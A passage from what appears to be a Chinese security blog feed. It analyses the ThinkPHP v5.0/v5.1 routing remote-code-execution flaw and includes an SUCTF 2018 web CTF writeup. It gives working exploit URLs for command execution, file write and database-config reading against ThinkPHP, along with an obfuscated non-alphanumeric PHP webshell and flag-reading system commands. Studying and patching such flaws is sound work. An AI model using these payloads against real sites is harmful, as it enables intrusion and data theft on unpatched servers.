class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认过滤机制</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(<span class="comment">// 实例化controller类</span></span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前操作名</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// 执行操作方法</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 空操作</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 操作不存在</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);<span class="comment">// 调用函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>拿到实例化后的对象和方法，动态调用<code>invokeMethod</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span><span class="params">($method, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($method)) &#123;</span><br><span class="line">        $class   = is_object($method[<span class="number">0</span>]) ? $method[<span class="number">0</span>] : <span class="keyword">self</span>::invokeClass($method[<span class="number">0</span>]);</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($class, $method[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 静态方法</span></span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $args = <span class="keyword">self</span>::bindParams($reflect, $vars);<span class="comment">// 获取参数内容 这里获取到参数用做method的参数输入</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">self</span>::$debug &amp;&amp; Log::record(<span class="string">'[ RUN ] '</span> . $reflect-&gt;class . <span class="string">'-&gt;'</span> . $reflect-&gt;name . <span class="string">'[ '</span> . $reflect-&gt;getFileName() . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs(<span class="keyword">isset</span>($class) ? $class : <span class="keyword">null</span>, $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里使用bindParams函数从get或post中获取到对应的内容，需要注意的是，做参数嵌入时，需要以函数的参数名为键<br>如invokeFunction的参数为<code>$function</code>、<code>$vars</code>，那么在参数中就需要以<code>function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx</code><br>即poc的后半部分<code>function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</code><br>所以调用链现在变成了</p><ol><li>动态调用\think\app invokeFunction函数</li><li>提供function=call_user_func_array作为invokeFunction动态调用的参数，所以下一步调用call_user_func_array函数</li><li>call_user_func_array的参数为system函数，system函数的参数为ls -l，所以这里用了2维数组</li></ol><p><img src="/attachments/93754c5f.png" alt="93754c5f.png"><br>所以我们可以发散一下思维，我们其实不单单可以调用\think\app这个类，如果其他的类可以任意调用其他函数，或者是调用命令执行函数，同样具有危害性<br>如任意命令执行<br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>任意文件写入，生成在index.php同一级目录<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br>获取配置信息<br><code>?s=index/\think\config/get&amp;name=database.username</code></p><h2 id="thinkphp-v5-1-x"><a href="#thinkphp-v5-1-x" class="headerlink" title="thinkphp v5.1.x"></a>thinkphp v5.1.x</h2><h4 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h4><p>版本：&lt;= v5.1.30<br>补丁信息：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">修正控制器调用 · top-think/framework@802f284 · GitHub</a><br>漏洞点：thinkphp/library/think/route/dispatch/Module.php</p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>原理同v5.0.x版本类似，也是由于s参数带入的路径解析存在安全问题导致的任意代码执行<br>先看App::run()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化应用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;dispatch;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">// 路由检测</span></span><br><span class="line">            $dispatch = <span class="keyword">$this</span>-&gt;routeCheck()-&gt;init();<span class="comment">// 处理module、controller、action</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (HttpResponseException $exception) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">null</span>;</span><br><span class="line">        $data     = $exception-&gt;getResponse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware-&gt;add(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($dispatch, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_null($data) ? $dispatch-&gt;run() : $data;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $response = <span class="keyword">$this</span>-&gt;middleware-&gt;dispatch(<span class="keyword">$this</span>-&gt;request);<span class="comment">// 动态调用controller、action</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>App::run()函数体现了程序的一个主要流程，从路径的解析到动态解析执行相应的控制器及方法<br>先来看看第13行，获取相应的路径信息<br>thinkphp/library/think/App.php routeCheck()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测路由缓存</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取应用调度信息</span></span><br><span class="line">    $path = <span class="keyword">$this</span>-&gt;request-&gt;path();</span><br><span class="line">    <span class="comment">// 从Request.php path提取urlpath 具体从pathinfo()，优先获取$_GET[$this-&gt;config['var_pathinfo']]</span></span><br><span class="line">    <span class="comment">// var_pathinfo 默认为s</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否强制路由模式</span></span><br><span class="line">    $must = !is_null(<span class="keyword">$this</span>-&gt;routeMust) ? <span class="keyword">$this</span>-&gt;routeMust : <span class="keyword">$this</span>-&gt;route-&gt;config(<span class="string">'url_route_must'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路由检测 返回一个Dispatch对象</span></span><br><span class="line">    $dispatch = <span class="keyword">$this</span>-&gt;route-&gt;check($path, $must);<span class="comment">//返回UrlDispatch类实例，从dispatch类处继承</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $dispatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第7行从s参数中获取路由路径(s为var_pathinfo的默认值)，在调用routeCheck函数后返回一个UrlDispatch，之后调用了Url类的init函数<br>thinkphp/library/think/route/dispatch/Url.php init<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析默认的URL规则</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line">    <span class="comment">// parseUrl函数处理参数值(以/分割，传入|也行会被替换成/，最终由/来分割)，返回[module,controller,action]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>返回Module对象，继承自Dispatch对象，并且调用了init函数，将解析后的路由填充到dispatch，供后面App::run()函数动态调用dispatch的run函数，v5.1版本的调用链复杂了一点，但是其实内容同v5.0版本类似<br>Dispatch::run()函数调用了Module::exec()函数<br>thinkphp/library/think/route/dispatch/Module.php exec()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 闭包调用</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简单描述exec函数，实例化controller，用于后面20行到55行的闭包函数，这个必报函数主要完成了调用controller的action，并获取输入的参数值，最后由invokeReflectMethod完成主要的调用。<br>最终的调用函数为Request::filterValue函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);<span class="comment">//调用函数</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 正则过滤</span></span><br><span class="line">                <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($filter)) &#123;</span><br><span class="line">                <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> === $value) &#123;</span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>到这里其实思路很明显，利用/分割出能利用的controller，并输入相应的参数值，接下来就是找可利用的函数。<br>v5.0版本中poc都能用</p><p>如任意命令执行<br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>任意文件写入，生成在index.php同一级目录<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br>获取配置信息<br><code>?s=index/\think\config/get&amp;name=database.username</code><br>除此之外，还可以使用\think\request/input（v5.0版本不能用是因为think\request的构造函数为protected，不允许动态调用）<br>如任意代码执行<br><code>?s=index/\think\request/input&amp;data[]=123&amp;filter=phpinfo</code><br>invokeFunction核心ReflectionFunction<br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1</code><br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br>因为think\app继承自think\container，所以改成think\app也行<br>其中call_user_func填充参数时，以数组形式，第一个为函数名，第二个为函数参数<br>call_user_func_array填充参数时，以数组形式，第一个为函数名，第二个为函数参数（也为数组形式）<br>这里v5.1只能用php7，如v5.0还可以使用assert来执行函数</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次出的这个漏洞危害很大，整个调用过程也非常漂亮，值得一步一步调试。<br>其中收获大致就是了解了thinkphp v5版本路由调用的流程，v5.1版本的闭包函数构造的方式给框架带来了不一样的感受，不得不给thinkphp一个赞</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF 2018 部分web writeup</title>
      <link href="2018/05/28/ctf/suctf-part-web-writeup/"/>
      <url>2018/05/28/ctf/suctf-part-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><p>抽了点时间做了2道SUCTF的web题，记录一下writeup。</p><a id="more"></a><h1 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>php的动态函数执行，以及create_function所返回的匿名函数</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>访问题目，直接给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$MY = create_function(&quot;&quot;,&quot;some code&quot;); // 执行了cat命令，读取flag内容</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路比较明确，就是想办法执行create_function所产生的匿名函数。<br>而其中SUCTF_32，这个函数明确是没办法爆破出来的。那么就只能在 <code>$MY</code> 上下功夫。<br>打印一下<code>$MY</code>的值，发现create_function返回了<code>\0lambda_{number}</code>,那么就很明确了，只要暴力一下这个number就有一定几率执行该函数，这里我暴力了大概1000多就有2条执行了</p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol><li>首先确定可用字符，使用bp将所有可见字符暴力一遍后发现可打印字符为<code>$ () [] _ ~ . ; =</code>，以及其他不可打印字符。</li><li>根据p牛的博客，发现取反中文可以起到作用，测试<code>~({中文})</code>发现可根据中文的utf-8编码的中间2个hex码进行对字母的遍历<br><a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li><li><p>凑出字符<code>assert</code>，<code>_GET</code>，并动态执行。<br>为了凑出上面的字符，我采用逐个反取反<code>bin2hex(~(&#39;a&#39;))</code>获得中文utf-8编码的中间2个，搜表即可找到对应的中文，写一下我的getshell代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=~(瞎);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(隙);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(卸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(勋);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(校);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(下);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(纤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(嫌);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure></li><li><p>上传了shell之后就比较容易了，翻目录即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;ls /&apos;)</span><br><span class="line">system(&apos;cat /Th1s_14_f14g&apos;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>记录一下getshell的坑点</p><ol><li>eval不是函数，是语句</li><li>不用引号，用中文也被php当作是字符串</li><li>UTF-8编码 <a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" 